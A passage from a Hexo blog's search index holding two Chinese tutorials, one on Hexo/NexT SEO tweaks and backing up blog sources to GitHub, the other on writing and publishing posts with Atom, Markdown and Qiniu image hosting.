<h2 id="6-添加文章-keywords-和-description"><a href="#6-添加文章-keywords-和-description" class="headerlink" title="6. 添加文章 keywords 和 description"></a>6. 添加文章 keywords 和 description</h2><p>在<code>\scaffolds\post.md</code> 中添加以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">keywords:</div><div class="line">categories:</div></pre></td></tr></table></figure></p>
<p>新建post的时候添加keywords，会自动转成 <code>&lt;meta name=&quot;keywords&quot; content=&quot;XXX&quot; /&gt;</code>。</p>
<h2 id="7-优化首页-title"><a href="#7-优化首页-title" class="headerlink" title="7. 优化首页 title"></a>7. 优化首页 title</h2><p>修改<code>\themes\next\layout\index.swig</code>文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% block title %&#125;  &#123;&#123; config.title &#125;&#125;  &#123;% endblock %&#125;</div><div class="line">改成</div><div class="line">&#123;% block title %&#125;  &#123;&#123; config.title &#125;&#125; - &#123;&#123; theme.description &#125;&#125;  &#123;% endblock %&#125;</div></pre></td></tr></table></figure></p>
<h2 id="8-修改网站链接"><a href="#8-修改网站链接" class="headerlink" title="8. 修改网站链接"></a>8. 修改网站链接</h2><p>编辑站点配置文件，将 url 修改为网站域名：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">url: http://0x4c43.cn</div></pre></td></tr></table></figure></p>
<h2 id="9-修改文章链接形式"><a href="#9-修改文章链接形式" class="headerlink" title="9. 修改文章链接形式"></a>9. 修改文章链接形式</h2><p>默认文章链接形式为<code>domain/year/month/day/title</code>，以改成<code>domain/title</code> 的形式，修改站点配置文件中 permalink 字段：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">permalink: :title/</div></pre></td></tr></table></figure></p>
<h1 id="0x09-Blog备份与恢复"><a href="#0x09-Blog备份与恢复" class="headerlink" title="0x09 Blog备份与恢复"></a>0x09 Blog备份与恢复</h1><p>Hexo blog 发布后，在 github 仓库中只保存有生成的静态文件，而 blog 的源文件：主题和文章等只保存在本地。为了避免电脑出故障导致数据丢失带来的麻烦，可以将源文件备份到 github 上。</p>
<h2 id="1-备份"><a href="#1-备份" class="headerlink" title="1. 备份"></a>1. 备份</h2><h3 id="1）修改-gitignore-文件"><a href="#1）修改-gitignore-文件" class="headerlink" title="1）修改.gitignore 文件"></a>1）修改.gitignore 文件</h3><p>指定部分文件不备份。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">.DS_Store</div><div class="line">Thumbs.db</div><div class="line">db.json</div><div class="line">*.log</div><div class="line">node_modules/</div><div class="line">public/</div><div class="line">.deploy*/</div><div class="line">.deploy_git</div><div class="line">themes</div></pre></td></tr></table></figure></p>
<h3 id="2）生成-git-仓库"><a href="#2）生成-git-仓库" class="headerlink" title="2）生成 git 仓库"></a>2）生成 git 仓库</h3><p>在站点根目录下执行 <code>git init</code>。</p>
<h3 id="3）添加远程仓库"><a href="#3）添加远程仓库" class="headerlink" title="3）添加远程仓库"></a>3）添加远程仓库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git remote add origin https://github.com/0x4C43/0x4C43.github.io.git</div></pre></td></tr></table></figure>
<h3 id="4）新建分支"><a href="#4）新建分支" class="headerlink" title="4）新建分支"></a>4）新建分支</h3><p>在站点根目录下执行 <code>git checkout –b Hexo</code> 新建分支 Hexo 用于备份源文件。</p>
<h3 id="5）添加到本地分支"><a href="#5）添加到本地分支" class="headerlink" title="5）添加到本地分支"></a>5）添加到本地分支</h3><p>将站点源文件提交到本地 Hexo 分支。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git add .</div><div class="line">git commit –m “blog”</div></pre></td></tr></table></figure></p>
<h3 id="6）push-到远程分支"><a href="#6）push-到远程分支" class="headerlink" title="6）push 到远程分支"></a>6）push 到远程分支</h3><p>执行 <code>git push origin Hexo:Hexo</code> 将本地 Hexo 分支推送到远程 Hexo 分支。</p>
<p>注：push 操作时出现错误及解决方法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">error: unable to create directory <span class="keyword">for</span> .git/logs/refs/remotes/origin/Hexo</div><div class="line">error: Cannot update the ref <span class="string">'refs/remotes/origin/Hexo'</span>.</div><div class="line">solution:</div><div class="line">sudo chown -R username .</div></pre></td></tr></table></figure></p>
<h3 id="7）成功备份"><a href="#7）成功备份" class="headerlink" title="7）成功备份"></a>7）成功备份</h3><p>之后写文章之后都先备份，再发布。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">git add .</div><div class="line">git commit –m “blog”</div><div class="line">git push origin Hexo:Hexo</div><div class="line"></div><div class="line">hexo clean</div><div class="line">hexo d -g</div></pre></td></tr></table></figure></p>
<h2 id="2-恢复"><a href="#2-恢复" class="headerlink" title="2. 恢复"></a>2. 恢复</h2><p>当需要在另一台电脑上写 blog 时，可以通过以下方式恢复 Hexo 环境。<br>1）下载 Node.js 并安装<br>2）下载安装git<br>3）下载安装hexo<br>4）恢复源文件<br>通过 Git 克隆备份的 blog：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> git@github.com:0x4C43/0x4C43.github.io.git</div></pre></td></tr></table></figure></p>
<p>5）切换到Hexo分支<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git checkout  Hexo</div></pre></td></tr></table></figure></p>
<p>6）安装 git 部署插件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install hexo-deployer-git</div></pre></td></tr></table></figure></p>
<p>之后就可以更新 blog 了。</p>
<h1 id="0x0A-备份Next主题"><a href="#0x0A-备份Next主题" class="headerlink" title="0x0A 备份Next主题"></a>0x0A 备份Next主题</h1><h2 id="1-将主题-fork-到自己仓库"><a href="#1-将主题-fork-到自己仓库" class="headerlink" title="1. 将主题 fork 到自己仓库"></a>1. 将主题 fork 到自己仓库</h2><h2 id="2-获取主题"><a href="#2-获取主题" class="headerlink" title="2. 获取主题"></a>2. 获取主题</h2><p>执行以下命令下载主题到本地。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git submolule add git@github.com:0x4C43/hexo-theme-next.git</div></pre></td></tr></table></figure></p>
<h2 id="3-push-到远程分支"><a href="#3-push-到远程分支" class="headerlink" title="3. push 到远程分支"></a>3. push 到远程分支</h2><p>将修改好主题后 push 到远程分支。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git commit -am <span class="string">"update theme"</span></div><div class="line">git push origin</div></pre></td></tr></table></figure></p>
<h2 id="4-恢复主题"><a href="#4-恢复主题" class="headerlink" title="4. 恢复主题"></a>4. 恢复主题</h2><p>在需要恢复主题时，执行如下命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git submodule init</div><div class="line">git submodule update</div></pre></td></tr></table></figure></p>
<hr>
<p>Reference:<br>[1] Hexo 官方文档：<a href="https://hexo.io/zh-cn/docs/setup.html" target="_blank" rel="external">https://hexo.io/zh-cn/docs/setup.html</a><br>[2] NexT 主题官网：<a href="http://theme-next.iissnan.com/" target="_blank" rel="external">http://theme-next.iissnan.com/</a><br>[3] Hexo-GitHub Page 博客绑定域名：<a href="http://ccxxmd.me/2017/03/04/Blog_domainname/" target="_blank" rel="external">http://ccxxmd.me/2017/03/04/Blog_domainname/</a><br>[4] 推荐网易云跟帖：<a href="https://blog.vadxq.com/dstogentie/" target="_blank" rel="external">https://blog.vadxq.com/dstogentie/</a><br>[5] Hexo Next 主题 SEO 优化：<a href="http://fanjun.im/2016/09/hexo_next_seo.html" target="_blank" rel="external">http://fanjun.im/2016/09/hexo_next_seo.html</a><br>[6] Hexo 博客备份：<a href="http://nhsensation.xyz/2016/03/14/move-blog/" target="_blank" rel="external">http://nhsensation.xyz/2016/03/14/move-blog/</a><br>[7] 备份 Hexo 源文件至 GitHub：<a href="http://www.leyar.me/backup-your-blog-to-github/" target="_blank" rel="external">http://www.leyar.me/backup-your-blog-to-github/</a></p>
]]></content>
      
        <categories>
            
            <category> Others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Next </tag>
            
            <tag> Github </tag>
            
            <tag> 域名绑定 </tag>
            
            <tag> SEO优化 </tag>
            
            <tag> Blog备份 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用 Atom 与 Markdown 写文章]]></title>
      <url>/2017/0426/write-articles-using-atom-and-markdown/</url>
      <content type="html"><![CDATA[<h1 id="0x01-Atom"><a href="#0x01-Atom" class="headerlink" title="0x01 Atom"></a>0x01 Atom</h1><p>Atom 是 Github 推出的一个开源跨平台文本编辑器。具有简洁和直观的图形用户界面，支持 CSS、HTML、JavaScript 等网页编程语言。 并且支持宏和自动分屏等功能，还集成了文件管理器。同时，Atom 也支持 Markdown 语法，所以可以很方便地写 Hexo blog。</p>
<p>可以在官网下载<a href="https://atom.io/" target="_blank" rel="external">Atom</a>。</p>
<h2 id="1-常用快捷键"><a href="#1-常用快捷键" class="headerlink" title="1. 常用快捷键"></a>1. 常用快捷键</h2><p>在File/Settings/Keybindiigns下定义了大量快捷键，常用快捷键如下:</p>
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Crtl+Shift+M</td>
<td style="text-align:left">开启Markdown实时预览</td>
</tr>
<tr>
<td style="text-align:left">Command+Shift+P</td>
<td style="text-align:left">打开命令窗口，可以运行各种菜单功能</td>
</tr>
<tr>
<td style="text-align:left">Command + T</td>
<td style="text-align:left">多文件切换</td>
</tr>
<tr>
<td style="text-align:left">Command + F</td>
<td style="text-align:left">文件内查找和替换</td>
</tr>
<tr>
<td style="text-align:left">Command + Shift + F</td>
<td style="text-align:left">多文件查找和替换</td>
</tr>
<tr>
<td style="text-align:left">Command + [</td>
<td style="text-align:left">对选中内容向左缩进</td>
</tr>
<tr>
<td style="text-align:left">Command + ]</td>
<td style="text-align:left">对选中内容向右缩进</td>
</tr>
<tr>
<td style="text-align:left">Command + \</td>
<td style="text-align:left">显示或隐藏目录树</td>
</tr>
<tr>
<td style="text-align:left">Crtl + m</td>
<td style="text-align:left">括号之间/HTML tag之间等跳转</td>
</tr>
</tbody>
</table>
<h2 id="2-插件"><a href="#2-插件" class="headerlink" title="2. 插件"></a>2. 插件</h2><p>Atom 支持插件扩展，下面列举一些实用的插件。点击File/Settings/Install，输入相应的插件名称进行安装。</p>
<ul>
<li>Vim 模式(vim-mode-plus)</li>
<li>增强预览(markdown-preview-plus)<br>需要关闭系统自带的 markdown-preview，Ctrl+Shift+M 打开预览窗口。</li>
<li>实时滚动预览(markdown-scroll-sync)<br>预览窗口将跟随编辑界面的鼠标移动，可实时查看效果。</li>
<li>格式化代码(atom-beautify)   </li>
<li>表格编辑(markdown-table-editor)<br>输入 table，然后按 Tab 键将自动输出表格样式。</li>
<li>导出pdf/png/jpeg/html(markdown-themeable-pdf)<br>在文章编辑区域单击右键，Markdown to PDF。若要导出其它格式，在 File/Settings/packeages/markdown-themeable-pdf/Settings 中进行设置。</li>
<li>博客支持(markdown-Writer)</li>
</ul>
<h1 id="0x02-Markdown-常用语法"><a href="#0x02-Markdown-常用语法" class="headerlink" title="0x02 Markdown 常用语法"></a>0x02 Markdown 常用语法</h1><blockquote>
<p>Markdown 是一种轻量级标记语言，它允许人们 “易读易写的纯文本格式编写文档，然后转换成有效的XHTML(或者HTML)文档”。Markdown 最重要的设计是可读性，能直接在字面上的被阅读，而不用被一些格式化指令标记 (如 RTF 与 HTML)。 因此，它是现行电子邮件标记格式的惯例，虽然它也借鉴了很多早期的标记语言，如：setext、Texile、reStructuredText。 — wikipedia</p>
</blockquote>
<h2 id="1-换行"><a href="#1-换行" class="headerlink" title="1. 换行"></a>1. 换行</h2><p>在行尾输入两个以上的空格然后回车。</p>
<h2 id="2-标题"><a href="#2-标题" class="headerlink" title="2. 标题"></a>2. 标题</h2><p>在标题内容前输入特定数量的’#’来实现对应级别的HTML样式的标题(HTML提供六级标题)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># 这是 H1</div><div class="line">## 这是 H2</div><div class="line">###### 这是 H6</div></pre></td></tr></table></figure></p>
<h2 id="3-区块引用"><a href="#3-区块引用" class="headerlink" title="3. 区块引用"></a>3. 区块引用</h2><p>在引用内容的每行或者是段首加 ‘&gt;’，引用块中可以根据层次加上不同数量的 ‘&gt;’进行嵌套引用。 同时，引用区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt; This is a blockquote with paragraphs.</div></pre></td></tr></table></figure></p>
<h2 id="4-列表"><a href="#4-列表" class="headerlink" title="4. 列表"></a>4. 列表</h2><p>Markdown 支持有序列表和无序列表。<br>无序列表使用 ‘*‘、’+’ 或是 ‘-‘ 作为列表标记：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-   Red   </div><div class="line">-   Green   </div><div class="line">-   Blue</div></pre></td></tr></table></figure></p>
<p>有序列表则使用数字接着一个英文句点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.  Bird</div><div class="line">2.  McHale</div><div class="line">3.  Parish</div></pre></td></tr></table></figure></p>
<p>当文章内容刚好行首出现数字-句点-空白时，不希望解析为有序列表，可以在句点前面加上反斜杠。</p>
<h2 id="5-代码块"><a href="#5-代码块" class="headerlink" title="5. 代码块"></a>5. 代码块</h2><p>在代码块的每行前面加 4 个空格或是 1 个制表符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">这是一个普通段落：</div><div class="line">    这是一个代码区块。</div></pre></td></tr></table></figure></p>
<p>当代码量较大时可以用三个反引号包围 ```。在代码块中添加一个可选的语言标识符,可以根据语法高亮显示，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&apos;&apos;&apos; C</div><div class="line">void main() &#123;</div><div class="line">  printf (&quot;Hello World!&quot;);</div><div class="line">&#125;</div><div class="line">&apos;&apos;&apos;</div></pre></td></tr></table></figure></p>
<p>如果要标记一小段行内代码，可以用反引号``，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Use the `printf()` function.</div></pre></td></tr></table></figure></p>
<h2 id="6-分割线"><a href="#6-分割线" class="headerlink" title="6. 分割线"></a>6. 分割线</h2><p>在一行中用三个以上的 ‘*‘ 或 ‘-‘ 来建立个分割线，在符号中间可以插入空格。下面是几种正确的写法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">* * *</div><div class="line">***</div><div class="line">*****</div><div class="line">- - -</div><div class="line">---------------------------------------</div></pre></td></tr></table></figure></p>
<h2 id="7-链接"><a href="#7-链接" class="headerlink" title="7. 链接"></a>7. 链接</h2><p>链接文字用 [方括号] 标记，方块括号后面圆括号中为网址链接（也可以是相对路径），网址后面双引号中的内容为链接的 title，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">This is [an example](http://example.com/ &quot;Title&quot;) inline link.</div><div class="line">[This link](http://example.net/) has no title attribute.</div></pre></td></tr></table></figure></p>
<h2 id="8-强调"><a href="#8-强调" class="headerlink" title="8. 强调"></a>8. 强调</h2><p>Markdown 使用 ‘*‘ 或 ‘_‘ 作为标记强调字词的符号。首尾各一个为斜体，首尾各两个为加粗。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">*single asterisks*</div><div class="line">_single underscores_</div><div class="line">**double asterisks**</div><div class="line">__double underscores__</div></pre></td></tr></table></figure></p>
<h2 id="9-设置字体"><a href="#9-设置字体" class="headerlink" title="9. 设置字体"></a>9. 设置字体</h2><p>使用以下语法可设置字体的类型、大小和颜色。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;font face=&quot;微软雅黑&quot;&gt;设置字体类型&lt;/font&gt;</div><div class="line">&lt;font size=4&gt;set font size&lt;/font&gt;    </div><div class="line">&lt;font color=red&gt; set font color &lt;/font&gt;</div></pre></td></tr></table></figure></p>
<p>效果如下：    </p>
<font face="微软雅黑">设置字体类型</font><br><font size="6">set font size</font><br><font color="red"> set font color </font>

<h2 id="10-图片"><a href="#10-图片" class="headerlink" title="10. 图片"></a>10. 图片</h2><p>Markdown 使用与链接相似的语法来标记图片，方括号内为图片的替代文字，圆括号内为图片地址，同样也可以加上 title。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">![Alt text](/path/to/img.jpg &quot;Title&quot;)</div></pre></td></tr></table></figure></p>
<h2 id="11-自动链接"><a href="#11-自动链接" class="headerlink" title="11. 自动链接"></a>11. 自动链接</h2><p>Markdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用方括号包起来， Markdown 就会自动把它转成链接。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;http://example.com/&gt;</div></pre></td></tr></table></figure></p>
<h2 id="12-表格"><a href="#12-表格" class="headerlink" title="12. 表格"></a>12. 表格</h2><p>在安装 markdown-table-editor 插件之后可以很方便的编辑表格，输入table,按 Tab 键就会出现表格样式。注意在表格之前要空一行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">| Header One | Header Two |</div><div class="line">|:---------- |:---------- |</div><div class="line">| Item One   | Item Two   |</div></pre></td></tr></table></figure></p>
<p>默认标题栏居中对齐，内容居左对齐。<br>-: 表示内容和标题栏靠右对齐，:- 表示内容和标题栏靠左对齐，:-: 表示内容和标题栏居中对齐。</p>
<h1 id="0x03-插入图片"><a href="#0x03-插入图片" class="headerlink" title="0x03 插入图片"></a>0x03 插入图片</h1><p>用 Markdown 写文章有个麻烦的地方就是不能直接插图片，通常需要将图片放在本地或者云上，然后在文章中通过图片链接（相对地址或网址）来插图片。为了节省 Blog 的空间，将图片上传到<a href="https://www.qiniu.com/" target="_blank" rel="external">七牛云</a>上。   </p>
<h2 id="1-注册账号并登录"><a href="#1-注册账号并登录" class="headerlink" title="1. 注册账号并登录"></a>1. 注册账号并登录</h2><h2 id="2-新建-buket"><a href="#2-新建-buket" class="headerlink" title="2. 新建 buket"></a>2. 新建 buket</h2><p>对象存储 &gt; 新建存储空间，输入相关信息。   </p>
<h2 id="3-极简图床-Chrome-插件"><a href="#3-极简图床-Chrome-插件" class="headerlink" title="3. 极简图床 Chrome 插件"></a>3. 极简图床 Chrome 插件</h2><p>使用极简图床可以绑定七牛云存储空间，然后可以通过拖拽的方式上传图片到云上。绑定七牛云需要空间名称、AK、SK 和域名。<br><img src="https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/17-4-26/26825806-file_1493208795361_1da.png" alt=""></p>
<h2 id="4-插入图片"><a href="#4-插入图片" class="headerlink" title="4. 插入图片"></a>4. 插入图片</h2><p>在文章中使用以下语法插入图片。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">![](image_link)</div><div class="line"></div><div class="line">&lt;div align=center&gt;  # 图片居中</div><div class="line">  &lt;img src= &quot;url&quot;/&gt;</div><div class="line">&lt;/div &gt;</div><div class="line"></div><div class="line">![](image_link?imageView/3/w/400/h/400/q/100)   # 七牛云图片缩放，w：刻度，h：高度，q：图片质量</div></pre></td></tr></table></figure></p>
<h1 id="0x04-文章发布"><a href="#0x04-文章发布" class="headerlink" title="0x04 文章发布"></a>0x04 文章发布</h1><p>在搭建好 Hexo Blog 之后，可以通过以下步骤新建并发布一篇新的文章。</p>
<h2 id="1-创建文章"><a href="#1-创建文章" class="headerlink" title="1. 创建文章"></a>1. 创建文章</h2><p>执行下列命令来创建一篇新文章。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hexo new post &lt;title&gt;</div></pre></td></tr></table></figure></p>
<h2 id="2-撰写文章"><a href="#2-撰写文章" class="headerlink" title="2. 撰写文章"></a>2. 撰写文章</h2><p>使用 Atom 和 Markdown 语法写文章内容。</p>
<h2 id="3-发布文章"><a href="#3-发布文章" class="headerlink" title="3. 发布文章"></a>3. 发布文章</h2><p>首先需要生成静态文件，然后部署到Hexo中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hexo clean  # 清除缓存文件 (db.json) 和已生成的静态文件 (public)</div><div class="line">hexo g      # 生成静态文件</div><div class="line">hexo d      # 部署网站</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="http://www.markdown.cn/" target="_blank" rel="external">Markdown 官网语法说明</a></p>
]]></content>
      
        <categories>
            
            <category> Others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Atom </tag>
            
            <tag> Markdown </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
